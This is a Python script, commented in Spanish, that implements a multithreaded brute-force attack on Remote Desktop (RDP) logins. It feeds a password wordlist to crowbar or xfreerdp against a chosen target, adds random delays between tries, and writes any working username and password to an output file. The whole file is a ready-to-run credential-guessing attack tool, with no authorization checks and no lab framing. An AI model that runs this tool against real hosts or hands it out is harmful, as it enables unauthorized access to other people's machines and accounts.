#!/usr/bin/env python3
"""
Ataque de fuerza bruta a RDP (Remote Desktop Protocol)
Usa xfreerdp o crowbar como backend
"""
import subprocess
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm

class RDPAttacker:
    def __init__(self, target, username, wordlist, threads=4, delay=0, output=None):
        self.target = target
        self.username = username
        self.wordlist = wordlist
        self.threads = threads
        self.delay = delay
        self.output = output
        self.found = False
    
    def save_result(self, password):
        """Guarda credenciales encontradas"""
        result = f"[+] RDP | {self.target} | {self.username}:{password}\n"
        if self.output:
            with open(self.output, 'a') as f:
                f.write(result)
            print(f"💾 Credenciales guardadas en: {self.output}")
    
    def try_rdp_crowbar(self, password):
        """Usa crowbar para probar RDP"""
        if self.delay > 0:
            time.sleep(random.uniform(0, self.delay))
        
        try:
            cmd = [
                'crowbar', '-b', 'rdp', '-s', self.target,
                '-u', self.username, '-C', password,
                '-t', '2', '-m', '5'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if 'success' in result.stdout.lower() or 'SUCCESS' in result.stdout:
                return True, password
            return False, None
        except:
            return False, None
    
    def try_rdp_freerdp(self, password):
        """Usa xfreerdp para probar RDP"""
        if self.delay > 0:
            time.sleep(random.uniform(0, self.delay))
        
        try:
            cmd = [
                'xfreerdp', f'/v:{self.target}', f'/u:{self.username}',
                f'/p:{password}', '/cert:ignore', '/auth-only', '/t:5'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
            
            if 'Authentication only' in result.stdout or 'connected' in result.stdout.lower():
                return True, password
            return False, None
        except:
            return False, None
    
    def attack(self):
        """Inicia ataque RDP"""
        print(f"🎯 RDP objetivo: {self.target}:3389")
        print(f"👤 Usuario: {self.username}")
        print(f"📖 Wordlist: {self.wordlist}")
        print(f"⚙️  Usando método: crowbar (recomendado)")
        
        # Verificar que crowbar está instalado
        try:
            subprocess.run(['crowbar', '-h'], capture_output=True)
        except FileNotFoundError:
            print("❌ crowbar no está instalado. Instálalo con: sudo apt install crowbar")
            print("   O usa: pip install crowbar")
            return
        
        with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f]
        
        total = len(passwords)
        print(f"📊 Total contraseñas: {total:,}")
        print(f"🚀 Iniciando ataque RDP con {self.threads} hilos...\n")
        
        with tqdm(total=total, desc="Probando RDP", unit="pass") as pbar:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(self.try_rdp_crowbar, pwd): pwd 
                          for pwd in passwords}
                
                for future in as_completed(futures):
                    success, password = future.result()
                    if success:
                        print(f"\n✅ ¡RDP CONEXIÓN EXITOSA! 🎉")
                        print(f"🔓 Credenciales: {self.username}:{password}")
                        self.save_result(password)
                        self.found = True
                        executor.shutdown(wait=False)
                        break
                    pbar.update(1)
        
        if not self.found:
            print("\n❌ No se encontraron credenciales válidas para RDP")
